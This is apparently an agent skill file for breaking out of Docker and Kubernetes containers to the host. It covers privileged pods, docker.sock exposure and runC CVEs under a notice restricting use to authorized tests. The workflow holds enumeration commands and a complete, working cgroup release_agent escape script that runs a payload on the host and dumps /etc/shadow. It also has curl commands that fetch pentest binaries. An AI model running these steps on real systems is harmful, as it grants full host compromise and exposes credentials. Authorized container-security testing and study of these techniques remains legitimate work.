---
name: escaping-containers-to-host
description: "Escape from container to host using privileged Pods, host mounts, runC CVEs, and exposed Docker sockets. Signals: container escape, docker escape, privileged container, runC, host."
zh-signals: "利用特权 Pod、宿主机挂载、runC CVE 和暴露的 Docker socket 从容器逃逸到宿主机。信号:容器逃逸,docker逃逸,特权容器,runC,宿主机。"
when-to-use: >-
  Exploits privileged pods, host mounts, runC CVEs, and exposed Docker sockets to break out of
  a container and reach the underlying host during an authorized container-security
  assessment. Use when executing an approved breakout test, demonstrating the real impact of a
  privileged or hostPath workload, or validating that escape mitigations actually hold.
  Keywords: container breakout, privileged, hostPath, docker.sock, runC CVE-2019-5736,
  CVE-2024-21626, release_agent, nsenter. Do not use for defensive detection of these
  techniques - use detecting-container-escape-attempts.
domain: cybersecurity
subdomain: container-security
tags:
- container-escape
- privileged-container
- runc-cve
- docker-socket
- host-mount
- kubernetes
- privilege-escalation
- breakout
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
mitre_attack:
- T1611
---
# Escaping Containers to Host

> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Container breakout grants full host compromise. Only run these techniques against systems you own or have explicit written authorization to test. Unauthorized use is illegal and may violate computer fraud laws.

## Overview

Container escape (MITRE ATT&CK T1611, Escape to Host) is the act of breaking the isolation boundary between a container and the host operating system, giving an attacker code execution in the host namespace — and, on Kubernetes, frequently a route to the entire node and then the cluster. Containers share the host kernel and rely on namespaces, cgroups, capabilities, seccomp, and LSMs (AppArmor/SELinux) for isolation. When any of these controls are weakened (a `--privileged` container, a mounted Docker socket, a `hostPath` mount of `/`, excess Linux capabilities such as `CAP_SYS_ADMIN`) or when a runtime contains a vulnerability, that boundary collapses.

This skill covers the four highest-impact, real-world escape primitives observed by Sysdig, Unit 42, and the runC maintainers:

1. **Misconfiguration escapes** — privileged containers, `CAP_SYS_ADMIN`, host PID/IPC/Network namespaces, and `hostPath` mounts.
2. **Exposed Docker socket** (`/var/run/docker.sock`) — mounting the daemon socket into a container hands an attacker root on the host via a new privileged container.
3. **The "Leaky Vessels" runC fd leak, CVE-2024-21626** — runC leaks an internal file descriptor (`/proc/self/fd/7`/`8`) referencing the host filesystem before `pivot_root`; setting the container working directory to that fd lands the process on the host. Patched in runC 1.1.12 (containerd 1.6.28/1.7.13, Docker 25.0.2).
4. **The November 2025 runC procfs write-redirect family — CVE-2025-31133, CVE-2025-52565, CVE-2025-52881** — race/symlink abuse of the `/dev/null`, `/dev/console`, and other bind mounts performed *before* runC applies `maskedPaths`/`readonlyPaths`, allowing read-write access to `/proc` entries (e.g. `/proc/sysrq-trigger`, `core_pattern`) and arbitrary write redirection. Patched in runC 1.2.8, 1.3.3, and 1.4.0-rc.3.

Sources: Palo Alto Networks "Leaky Vessels" advisory; Sysdig "New runc vulnerabilities allow container escape" (2025); opencontainers/runc security advisories GHSA-cgrx-mc8f-2prm and GHSA-9493-h29p-rfm2; Unit 42 container-escape research.

## When to Use

- During an authorized container or Kubernetes penetration test after obtaining initial code execution inside a container or pod
- When validating that runtime defenses (Falco, seccomp, AppArmor) detect or block breakout attempts
- When assessing the blast radius of a compromised microservice
- When verifying patch levels of runC/containerd/Docker against the CVEs above

## Prerequisites

- Authorization (signed rules of engagement) covering host/node compromise
- A foothold: a shell inside a target container
- Reconnaissance utilities inside the container or staged in:
  ```bash
  # deepce - Docker enumeration and escape
  git clone https://github.com/stealthcopter/deepce.git
  # amicontained - container introspection (capabilities, seccomp, namespaces)
  curl -L https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64 -o amicontained
  chmod +x amicontained
  # CDK - zero-dependency K8s/container pentest toolkit
  curl -L https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64 -o cdk
  chmod +x cdk
  ```
- A lab cluster/host you are permitted to break out of (e.g., kind, minikube, or a dedicated VM)

## Objectives

- Enumerate the container's privilege posture (capabilities, namespaces, mounts, seccomp)
- Identify which escape primitive is available
- Execute a host breakout and prove host-level code execution
- Capture evidence (host hostname, host `/etc/shadow` access, or a host file write)
- Document the root-cause misconfiguration or vulnerable runtime version for remediation

## MITRE ATT&CK Mapping

| Technique ID | Name | Tactic |
|--------------|------|--------|
| T1611 | Escape to Host | Privilege Escalation |
| T1610 | Deploy Container | Defense Evasion / Execution |
| T1613 | Container and Resource Discovery | Discovery |
| T1068 | Exploitation for Privilege Escalation | Privilege Escalation |

## Workflow

### Step 1: Enumerate the Container Environment

Determine privilege level, capabilities, namespaces, and mounted host paths.

```bash
# Quick capability + namespace + seccomp introspection
./amicontained

# Are we privileged? CapEff ending in ...ffffffff is "all caps"
grep CapEff /proc/self/status
capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')

# Host filesystem or docker socket mounted in?
mount | grep -E 'docker.sock|hostPath|/host'
ls -la /var/run/docker.sock 2>/dev/null
findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS

# Sharing host namespaces? (host PID = can see host processes)
ps aux | head        # if you see systemd/host pids, hostPID:true
ls -la /proc/1/root  # if readable as host root, namespace is shared

# Automated enumeration
./deepce.sh
./cdk evaluate
```

### Step 2: Escape via a Privileged Container (cgroup release_agent)

A `--privileged` container (or one with `CAP_SYS_ADMIN`) can mount a cgroup hierarchy and abuse the `release_agent` to run a command on the host when the last process in a cgroup exits.

```bash
# Confirm we can mount (CAP_SYS_ADMIN present)
# Create a cgroup mount and enable release_agent notification
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
  mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# Find the container rootfs path on the host
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Payload that runs on the HOST
cat > /cmd <<'EOF'
#!/bin/sh
ps aux > /output
hostname >> /output
cat /etc/shadow >> /output
EOF
chmod +x /cmd

# Trigger: spawn and immediately exit a process in the cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output   # host process list / shadow proves escape
```

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
